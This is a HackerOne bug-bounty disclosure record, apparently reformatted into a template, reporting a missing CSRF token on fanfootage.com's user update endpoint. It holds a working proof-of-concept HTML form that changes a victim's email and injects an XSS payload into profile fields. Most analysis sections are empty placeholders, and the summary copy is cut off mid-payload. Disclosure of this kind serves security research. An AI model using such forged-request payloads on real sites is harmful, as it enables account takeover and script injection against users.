# NO CSRF token found on user details update

## Metadata
- **Source:** HackerOne
- **Report:** 15454 | https://hackerone.com/reports/15454
- **Submitted:** 2014-06-07
- **Reporter:** chandrakant
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Here is the CSRF

<html>
  <!-- CSRF PoC  BY Chandrakant -->
  <body>
    <form action="https://fanfootage.com/users/update" method="POST">
      <input type="hidden" name="utf8" value="â&#156;&#147;" />
      <input type="hidden" name="&#95;method" value="patch" />
      <input type="hidden" name="user&#91;username&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Here is the CSRF

<html>
  <!-- CSRF PoC  BY Chandrakant -->
  <body>
    <form action="https://fanfootage.com/users/update" method="POST">
      <input type="hidden" name="utf8" value="â&#156;&#147;" />
      <input type="hidden" name="&#95;method" value="patch" />
      <input type="hidden" name="user&#91;username&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#41;&gt;" />
      <input type="hidden" name="user&#91;email&#93;" value="chandrakantnial8&#64;gmail&#46;com" />
      <input type="hidden" name="user&#91;full&#95;name&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#41;&gt;" />
      <input type="hidden" name="commit" value="Done" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


</details>

---
*Analysed by Claude on 2026-05-24*
